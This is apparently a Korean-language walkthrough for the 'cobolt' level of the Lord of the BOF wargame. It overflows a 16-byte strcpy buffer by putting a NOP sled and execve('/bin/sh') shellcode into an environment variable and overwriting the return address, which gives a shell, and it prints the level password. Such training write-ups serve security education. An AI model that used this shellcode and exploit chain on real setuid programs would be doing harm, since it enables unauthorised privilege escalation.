# cobolt

```c
[gremlin@localhost gremlin]$ cat cobolt.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - cobolt
        - small buffer
*/

int main(int argc, char *argv[])
{
    char buffer[16];
    if(argc < 2){
        printf("argv error\n");
        exit(0);
    }
    strcpy(buffer, argv[1]);
    printf("%s\n", buffer);
}
```

gremlin과 거의 유사한 문제이지만 buffer의 크기가 16bytes로 쉘코드를 올릴 수 없다. 

그래서 환경변수를 이용하거나 eggshell을 이용해 이 문제를 해결할 수 있는데 환경변수를 이용하도록 한다.

```bash
[gremlin@localhost gremlin]$ cp cobolt attackme
[gremlin@localhost gremlin]$ ls
attackme  cobolt  cobolt.c
```

역시 먼저 gdb로 공격하기 위해 attackme라는 복사본을 만든다.

환경 변수에 쉘코드를 올리고 

```bash
[gremlin@localhost gremlin]$ export shellcode=`python -c 'print "\x90"*512+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
```

*NOP을 추가하는 이유는 환경 변수의 주소가 프로세스마다 조금씩 변하는데 정확하게 집어내는 것보다 편하고 공격 확률을 높일 수 있는 방법이기 때문이다.

=> NOP을 추가하지 않고 해결하는 방법과 스택에서 환경 변수의 위치에 대한 정보를 좀 더 찾아봐야 한다.

env라는 명령어를 통해 제대로 입력됐는지 확인해본다.

```bash
[gremlin@localhost gremlin]$ env
LESSOPEN=|/usr/bin/lesspipe.sh %s
USERNAME=
HISTSIZE=1000
HOSTNAME=localhost.localdomain
LOGNAME=gremlin
REMOTEHOST=192.168.74.1
MAIL=/var/spool/mail/gremlin
shellcode=▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒▒°
                                                                                          ̀
TERM=xterm
HOSTTYPE=i386
PATH=/usr/local/bin:/bin:/usr/bin:/usr/X11R6/bin:/home/gremlin/bin
HOME=/home/gremlin
INPUTRC=/etc/inputrc
SHELL=/bin/bash
USER=gremlin
BASH_ENV=/home/gremlin/.bashrc
LANG=en_US
OSTYPE=Linux
SHLVL=1
LS_COLORS=no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:bd=40;33;01:cd=40;33;01:or=01;05;37;41:mi=01;05;37;41:ex=01;32:*.cmd=01;32:*.exe=01;32:*.com=01;32:*.btm=01;32:*.bat=01;32:*.sh=01;32:*.csh=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.bz2=01;31:*.bz=01;31:*.tz=01;31:*.rpm=01;31:*.cpio=01;31:*.jpg=01;35:*.gif=01;35:*.bmp=01;35:*.xbm=01;35:*.xpm=01;35:*.png=01;35:*.tif=01;35:
_=/usr/bin/env
```

중간에 shellcode라는 환경 변수가 있음을 확인할 수 있다.

이제 이 환경 변수의 주소를 구하고 입력값으로 넣어주면 된다.

주소를 구하는 코드를 새로 짜야하는데 getenv라는 함수를 이용하면 쉽게 구할 수 있다.

```bash
[gremlin@localhost gremlin]$ cat > addr.c
#include <stdio.h>

int main(){
        printf("%p\n",getenv("shellcode"));
}
```

컴파일 후 실행하여 주소값을 확인하면

```bash
[gremlin@localhost gremlin]$ gcc -o shell addr.c
[gremlin@localhost gremlin]$ ls
addr.c  attackme  cobolt  cobolt.c  shell
[gremlin@localhost gremlin]$ ./shell
0xbffffdcf
```

0xbffffdcf라는 주소가 나온다. 이 주소를 리틀엔디언 방식으로 전달해 입력으로 주면 되는데 어디다 줘야하는지 확이해야하므로 gdb로 attackme를 열어 위치를 확인해 본다.(buffer가 16이니까 sfp까지 20을 주면 되긴하다.)

```bash
[gremlin@localhost gremlin]$ gdb attackme
GNU gdb 19991004
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-redhat-linux"...
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
0x8048430 <main>:       push   %ebp
0x8048431 <main+1>:     mov    %ebp,%esp
0x8048433 <main+3>:     sub    %esp,16
0x8048436 <main+6>:     cmp    DWORD PTR [%ebp+8],1
0x804843a <main+10>:    jg     0x8048453 <main+35>
0x804843c <main+12>:    push   0x80484d0
0x8048441 <main+17>:    call   0x8048350 <printf>
0x8048446 <main+22>:    add    %esp,4
0x8048449 <main+25>:    push   0
0x804844b <main+27>:    call   0x8048360 <exit>
0x8048450 <main+32>:    add    %esp,4
0x8048453 <main+35>:    mov    %eax,DWORD PTR [%ebp+12]
0x8048456 <main+38>:    add    %eax,4
0x8048459 <main+41>:    mov    %edx,DWORD PTR [%eax]
0x804845b <main+43>:    push   %edx
0x804845c <main+44>:    lea    %eax,[%ebp-16]
0x804845f <main+47>:    push   %eax
0x8048460 <main+48>:    call   0x8048370 <strcpy>
0x8048465 <main+53>:    add    %esp,8
0x8048468 <main+56>:    lea    %eax,[%ebp-16]
0x804846b <main+59>:    push   %eax
0x804846c <main+60>:    push   0x80484dc
0x8048471 <main+65>:    call   0x8048350 <printf>
0x8048476 <main+70>:    add    %esp,8
0x8048479 <main+73>:    leave
0x804847a <main+74>:    ret
0x804847b <main+75>:    nop
0x804847c <main+76>:    nop
0x804847d <main+77>:    nop
0x804847e <main+78>:    nop
0x804847f <main+79>:    nop
End of assembler dump.
```

main+44번쨰 줄을 보면 ebp-16이 나오는데 ebp에서 16만큼 떨어진 자리가 입력의 시작점이므로 sfp 4bytes를 더해 20bytes를 NOP으로 채워주고 환경 변수의 주소를 적어주면 해결된다.

```bash
[gremlin@localhost gremlin]$ ./cobolt `python -c 'print "\x90"*20+"\xcf\xfd\xff\xbf"'`
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
bash$ whoami
cobolt
bash$ my-pass
euid = 502
hacking exposed
```

cobolt의 password는 hacking exposed이다.